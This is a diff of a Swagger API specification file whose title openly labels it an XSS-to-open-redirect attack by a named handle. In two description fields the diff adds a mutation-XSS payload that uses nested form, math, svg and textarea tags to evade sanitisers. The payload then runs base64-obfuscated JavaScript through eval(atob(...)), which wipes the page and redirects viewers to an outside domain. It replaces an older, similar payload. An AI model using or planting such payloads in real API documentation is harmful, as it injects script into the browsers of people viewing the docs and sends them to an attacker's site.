@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M0X0101
+  title: XSS TO OPEN REDIRECT ATTACK BY I_EH_DREAMER
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onload='window.location=https://www.example.com;' src='example.jpg' />"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vaWVoZHJlYW1lci5pbic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -15,20 +15,20 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /M0X0101:
+  /cyberarch:
     get:
       responses:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - i_eh_dreamer_XSS_TO_OPEN_REDIRECT_D
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id"=</textarea><img onload='window.location=https://www.example.com;' src='example.jpg' />"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9Jyc7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZm9ybScpO2EubWV0aG9kPSdQT1NUJzt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8vaWVoZHJlYW1lci5pbic7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=' onerror='eval(atob(this.id))'>"></form>
 
           format: int64
           in: path
